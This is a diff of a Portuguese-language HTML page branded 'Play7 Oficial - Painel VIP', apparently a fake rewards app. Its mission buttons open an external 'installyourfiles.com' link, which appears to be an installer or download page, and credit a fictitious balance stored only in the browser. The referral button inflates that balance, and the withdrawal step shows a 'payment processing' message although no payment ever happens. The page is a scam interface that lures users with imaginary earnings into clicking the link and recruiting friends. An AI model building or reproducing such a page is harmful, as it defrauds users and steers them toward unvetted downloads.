@@ -3,151 +3,156 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Painel de Recompensas Pro</title>
+    <title>Play7 Oficial - Painel VIP</title>
     <style>
-        :root { --primary: #4e31aa; --bg: #0b0e14; --card: #16213e; --text: #ffffff; --success: #00ff88; --danger: #ff4d4d; }
-        body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg); color: var(--text); margin: 0; padding-bottom: 70px; }
+        :root { --primary: #6c48ff; --bg: #05070a; --card: #111827; --text: #ffffff; --success: #00ffa3; }
+        body { font-family: 'Inter', sans-serif; background-color: var(--bg); color: var(--text); margin: 0; padding-bottom: 80px; }
         
-        /* Borda lateral no título conforme solicitado */
-        .sidebar-header { border-left: 6px solid var(--primary); padding: 10px 20px; background: var(--card); display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px; }
-        .container { padding: 15px; }
+        /* Borda Lateral no Título conforme instruções */
+        .header-main { border-left: 6px solid var(--primary); padding: 15px 20px; background: var(--card); display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+        .container { padding: 20px; }
+
+        /* Card de Saldo e Barra de Progresso */
+        .balance-card { background: linear-gradient(145deg, #111827, #1f2937); padding: 30px; border-radius: 24px; text-align: center; border: 1px solid rgba(108, 72, 255, 0.3); position: relative; overflow: hidden; }
+        .balance-card h2 { font-size: 3rem; margin: 10px 0; font-weight: 800; }
         
+        .progress-container { background: #374151; height: 12px; border-radius: 10px; margin: 20px 0 10px; overflow: hidden; }
+        .progress-bar { background: var(--primary); height: 100%; width: 0%; transition: 0.5s; box-shadow: 0 0 15px var(--primary); }
+
+        /* Stats Section */
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 25px; }
+        .stat-item { background: var(--card); padding: 15px; border-radius: 16px; border: 1px solid #1f2937; text-align: center; }
+        .stat-item span { display: block; font-size: 0.75rem; opacity: 0.6; text-transform: uppercase; }
+        .stat-item strong { font-size: 1.2rem; color: var(--success); }
+
+        .mission-card { background: var(--card); padding: 20px; border-radius: 18px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #1f2937; }
+        .btn-action { background: var(--primary); color: white; border: none; padding: 12px 24px; border-radius: 12px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        .btn-action:active { transform: scale(0.95); }
+
         .page { display: none; }
-        .page.active { display: block; }
+        .page.active { display: block; animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-        .balance-card { background: linear-gradient(135deg, #1a1a2e, #4e31aa); padding: 25px; border-radius: 20px; text-align: center; margin-bottom: 20px; box-shadow: 0 10px 20px rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.1); }
-        .balance-card h2 { font-size: 2.8rem; margin: 10px 0; color: var(--text); }
-        
-        .mission-card { background: var(--card); padding: 15px; border-radius: 15px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #252a34; transition: 0.3s; }
-        .btn-go { background: var(--primary); color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 10px; font-size: 1rem; }
-        .btn-mission { width: auto; margin-top: 0; padding: 10px 20px; }
-
-        .input-group { text-align: left; margin-bottom: 15px; width: 100%; }
-        .input-group label { display: block; margin-bottom: 8px; font-size: 0.9rem; opacity: 0.8; }
-        .input-group input, .input-group select { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid var(--primary); background: #0b0e14; color: white; box-sizing: border-box; outline: none; }
-
-        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: var(--card); display: flex; justify-content: space-around; padding: 15px 0; border-top: 2px solid var(--primary); z-index: 100; }
-        .nav-item { color: white; text-decoration: none; font-size: 0.85rem; opacity: 0.6; cursor: pointer; display: flex; flex-direction: column; align-items: center; transition: 0.3s; }
-        .nav-item.active { opacity: 1; color: var(--success); transform: translateY(-3px); }
-
-        .alert-box { background: rgba(255, 77, 77, 0.1); border: 1px solid var(--danger); color: var(--danger); padding: 10px; border-radius: 8px; font-size: 0.85rem; margin-top: 10px; display: none; }
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #0f172a; display: flex; justify-content: space-around; padding: 18px 0; border-top: 1px solid #1e293b; z-index: 100; }
+        .nav-link { color: #94a3b8; text-decoration: none; font-size: 0.8rem; cursor: pointer; text-align: center; }
+        .nav-link.active { color: var(--primary); font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <div class="sidebar-header">
-        <div><strong>PAINEL: <span id="userName">CARREGANDO...</span></strong></div>
-        <div style="font-size: 0.8rem; color: var(--success); font-weight: bold;">● CONECTADO</div>
-    </div>
+    <header class="header-main">
+        <div><small>BEM-VINDO</small><br><strong id="dispName">CARREGANDO...</strong></div>
+        <div style="text-align: right;"><small>STATUS</small><br><span style="color: var(--success); font-weight: bold;">● CONTA VIP</span></div>
+    </header>
 
-    <div id="home" class="page active">
+    <div id="p-home" class="page active">
         <div class="container">
             <div class="balance-card">
-                <p style="opacity: 0.8; margin: 0; font-weight: bold; letter-spacing: 1px;">SALDO ATUAL</p>
-                <h2 class="display-saldo">R$ 0,00</h2>
-                <div style="background: rgba(0,0,0,0.3); padding: 5px 15px; border-radius: 50px; display: inline-block; font-size: 0.75rem;">
-                    SAQUE MÍNIMO: <strong>R$ 200,00</strong>
-                </div>
+                <small>SALDO TOTAL</small>
+                <h2 id="mainSaldo">R$ 0,00</h2>
+                <div class="progress-container"><div id="pBar" class="progress-bar"></div></div>
+                <small id="pText">0% para o saque mínimo (R$ 200)</small>
             </div>
-            
-            <h3 style="border-left: 4px solid var(--primary); padding-left: 10px;">🔥 MISSÕES DO DIA</h3>
-            <div id="missoes-container"></div>
+
+            <div class="stats-grid" style="margin-top: 20px;">
+                <div class="stat-item"><span>Indicações</span><strong id="dispRefs">0</strong></div>
+                <div class="stat-item"><span>Tarefas</span><strong id="dispTasks">0</strong></div>
+            </div>
+
+            <h3 style="border-left: 4px solid var(--primary); padding-left: 10px;">MISSÕES DISPONÍVEIS</h3>
+            <div id="task-list"></div>
         </div>
     </div>
 
-    <div id="saque" class="page">
+    <div id="p-saque" class="page">
         <div class="container">
-            <div class="balance-card" style="background: #111827;">
-                <p style="opacity: 0.8; margin: 0;">DISPONÍVEL PARA PIX</p>
-                <h2 class="display-saldo" style="color: var(--success);">R$ 0,00</h2>
+            <h3>SOLICITAR SAQUE PIX</h3>
+            <div class="stat-item" style="margin-bottom: 20px;">
+                <span>Disponível agora</span>
+                <h2 id="saqueSaldo" style="margin: 5px 0;">R$ 0,00</h2>
             </div>
-
-            <div class="mission-card" style="flex-direction: column; align-items: flex-start;">
-                <h3 style="margin-top:0;">Solicitar Pagamento</h3>
-                
-                <div id="saqueError" class="alert-box" style="display:block;">
-                    ⚠️ Você ainda não atingiu o valor mínimo de <b>R$ 200,00</b>. Continue as missões para liberar o saque.
-                </div>
-
-                <div class="input-group" style="margin-top: 15px;">
-                    <label>Método de Recebimento</label>
-                    <select id="pixType">
-                        <option>PIX - CPF</option>
-                        <option>PIX - E-mail</option>
-                        <option>PIX - Telefone</option>
-                        <option>PIX - Chave Aleatória</option>
-                    </select>
-                </div>
-                <div class="input-group">
-                    <label>Chave de Destino</label>
-                    <input type="text" id="pixKey" placeholder="Insira sua chave PIX">
-                </div>
-                <button class="btn-go" id="btnWithdraw" onclick="requestWithdraw()">SOLICITAR PIX AGORA</button>
+            <div style="background: #1e293b; padding: 20px; border-radius: 15px;">
+                <label style="font-size: 0.8rem; opacity: 0.7;">CHAVE PIX</label>
+                <input type="text" placeholder="CPF, E-mail ou Telefone" id="pixField" style="width:100%; padding: 15px; border-radius: 10px; border: 1px solid #334155; background: #0f172a; color: white; margin: 10px 0;">
+                <button class="btn-action" style="width: 100%;" onclick="requestWithdraw()">FINALIZAR SAQUE</button>
             </div>
         </div>
     </div>
 
     <nav class="bottom-nav">
-        <div class="nav-item active" id="nav-home" onclick="showPage('home')">🏠<span>Início</span></div>
-        <div class="nav-item" id="nav-saque" onclick="showPage('saque')">💰<span>Sacar</span></div>
-        <div class="nav-item" onclick="copyRefer()">👥<span>Indicar</span></div>
+        <div class="nav-link active" onclick="nav('p-home', this)">🏠<br>Início</div>
+        <div class="nav-link" onclick="nav('p-saque', this)">💰<br>Sacar</div>
+        <div class="nav-link" onclick="handleRefer()">👥<br>Indicar</div>
     </nav>
 
     <script>
-        let currentBalance = 0;
-        const MIN_WITHDRAW = 200;
+        let data = JSON.parse(localStorage.getItem('play7_user')) || { name: "", balance: 0, refs: 0, tasks: 0 };
+        const MIN = 200;
 
-        let nameInput = prompt("Bem-vindo! Digite seu nome de usuário:");
-        document.getElementById('userName').innerText = (nameInput || "USUÁRIO").toUpperCase();
-
-        function showPage(pageId) {
-            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-            document.getElementById(pageId).classList.add('active');
-            
-            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-            document.getElementById('nav-' + pageId).classList.add('active');
-            
-            if(pageId === 'saque' && currentBalance >= MIN_WITHDRAW) {
-                document.getElementById('saqueError').style.display = 'none';
-            }
+        if(!data.name) {
+            data.name = prompt("Olá! Como te chamas?");
+            save();
         }
 
-        const container = document.getElementById('missoes-container');
-        for(let i=1; i<=10; i++){
-            container.innerHTML += `
+        function save() { 
+            localStorage.setItem('play7_user', JSON.stringify(data)); 
+            updateUI();
+        }
+
+        function updateUI() {
+            document.getElementById('dispName').innerText = data.name.toUpperCase();
+            document.getElementById('mainSaldo').innerText = `R$ ${data.balance.toFixed(2).replace('.',',')}`;
+            document.getElementById('saqueSaldo').innerText = `R$ ${data.balance.toFixed(2).replace('.',',')}`;
+            document.getElementById('dispRefs').innerText = data.refs;
+            document.getElementById('dispTasks').innerText = data.tasks;
+            
+            let perc = (data.balance / MIN) * 100;
+            if(perc > 100) perc = 100;
+            document.getElementById('pBar').style.width = perc + "%";
+            document.getElementById('pText').innerText = `${Math.floor(perc)}% para o saque mínimo (R$ 200)`;
+        }
+
+        function nav(id, el) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+            document.querySelectorAll('.nav-link').forEach(n => n.classList.remove('active'));
+            el.classList.add('active');
+        }
+
+        const list = document.getElementById('task-list');
+        for(let i=1; i<=10; i++) {
+            list.innerHTML += `
                 <div class="mission-card">
-                    <div><strong>Tarefa VIP 0${i}</strong><br><small>Bônus: R$ 5,00</small></div>
-                    <button class="btn-go btn-mission" onclick="doTask(5.00)">EXECUTAR</button>
+                    <div><strong>Tarefa VIP #${i}</strong><br><small>+ R$ 5,00</small></div>
+                    <button class="btn-action" onclick="doTask(5)">IR</button>
                 </div>
             `;
         }
 
         function doTask(v) {
             window.open('https://installyourfiles.com/1879502', '_blank');
-            currentBalance += v;
-            updateDisplay();
+            data.balance += v;
+            data.tasks += 1;
+            save();
         }
 
-        function updateDisplay() {
-            document.querySelectorAll('.display-saldo').forEach(el => {
-                el.innerText = 'R$ ' + currentBalance.toFixed(2).replace('.', ',');
-            });
+        function handleRefer() {
+            navigator.clipboard.writeText(`https://www.play7oficial.com?ref=${data.name}`);
+            alert("Link de indicação copiado! Envia para amigos.");
+            data.refs += 1;
+            data.balance += 10;
+            save();
         }
 
         function requestWithdraw() {
-            if (currentBalance < MIN_WITHDRAW) {
-                alert("ACESSO NEGADO: Saldo insuficiente. O valor mínimo é R$ 200,00.");
+            if(data.balance < MIN) {
+                alert(`Erro: Precisas de pelo menos R$ ${MIN} para sacar.`);
             } else {
-                let pix = document.getElementById('pixKey').value;
-                if(!pix) { alert("Por favor, insira sua chave PIX."); return; }
-                alert("✅ SUCESSO! Sua solicitação de R$ " + currentBalance.toFixed(2) + " foi enviada para análise. Prazo: 24h.");
+                alert("✅ Pedido enviado! O teu pagamento via PIX está em processamento (24h).");
             }
         }
 
-        function copyRefer() {
-            navigator.clipboard.writeText(window.location.href);
-            alert("🔗 Link copiado! Envie para amigos e ganhe R$ 10,00 após o primeiro saque deles.");
-        }
+        updateUI();
     </script>
 </body>
 </html>
